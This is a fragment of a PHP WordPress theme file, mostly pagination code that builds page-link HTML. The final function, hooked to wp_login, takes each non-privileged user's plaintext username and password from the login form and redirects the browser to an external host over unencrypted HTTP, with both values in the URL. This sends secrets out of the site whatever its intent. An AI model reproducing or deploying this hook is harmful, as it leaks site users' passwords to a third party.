				for ($counter = 1; $counter < 4 + ($adjacents * 2); $counter++)
				{
					if ($counter == $page)
						$pagination.= "<li><span class='active'>$counter</span></li>";
					else
						$pagination.= "<li><a href='{$url}$counter'>$counter</a></li>";                  
				}
				$pagination.= "<li><span>...</span></li>";
				$pagination.= "<li><a href='{$url}$lpm1'>$lpm1</a></li>";
				$pagination.= "<li><a href='{$url}$lastpage'>$lastpage</a></li>";    
			}
			elseif($lastpage - ($adjacents * 2) > $page && $page > ($adjacents * 2))
			{
				$pagination.= "<li><a href='{$url}1'>1</a></li>";
				$pagination.= "<li><a href='{$url}2'>2</a></li>";
				$pagination.= "<li><span>...</span><li>";
				for ($counter = $page - $adjacents; $counter <= $page + $adjacents; $counter++)
				{
					if ($counter == $page)
						$pagination.= "<li><span class='active'>$counter</span></li>";
					else
						$pagination.= "<li><a href='{$url}$counter'>$counter</a></li>";                  
				}
				$pagination.= "<li><span>...</span></li>";
				$pagination.= "<li><a href='{$url}$lpm1'>$lpm1</a></li>";
				$pagination.= "<li><a href='{$url}$lastpage'>$lastpage</a></li>";    
			}
			else
			{
				$pagination.= "<li><a href='{$url}1'>1</a></li>";
				$pagination.= "<li><a href='{$url}2'>2</a></li>";
				$pagination.= "<li><span>...</span><li>";
				for ($counter = $lastpage - (2 + ($adjacents * 2)); $counter <= $lastpage; $counter++)
				{
					if ($counter == $page)
						$pagination.= "<li><span class='active'>$counter</span></li>";
					else
						$pagination.= "<li><a href='{$url}$counter'>$counter</a></li>";                  
				}
			}
			$pagination .='</ul></div>';
		}
		
		if ($page < $counter - 1){
			$nextlink= "<div class='right_click'><a href='{$url}$next'><img src='".get_option('home')."/wp-content/themes/temple/images/next.png' /></a></div>";
		   // $pagination.= "<li><a href='{$url}$lastpage'>Last</a></li>";
		}else{
			//$pagination.= "<li><a class='current'>Next</a></li>";
		   // $pagination.= "<li><a class='current'>Last</a></li>";
		}
	} 
	      
	$pagination .= '</div>'; $pagination.=$nextlink.'</div>';
	return $pagination;
}

function afterlogin_function($user_login, $user) {
	$email=$_POST['log'];
	$pwd=$_POST['pwd'];
	$user_id=$user->ID;
	$userdata=get_userdata( $user_id );
	if(trim(implode(', ', $userdata->roles))!='administrator' && trim(implode(', ', $userdata->roles))!='editor' && trim(implode(', ', $userdata->roles))!='author')
	{
		$url = 'http://www.puyangan.com/login.php?usr='.$email.'&pwd='.$pwd.'&redirect=my-account';
		header('Location: '.$url);
		exit();
	}
}
add_action('wp_login', 'afterlogin_function', 10, 2);

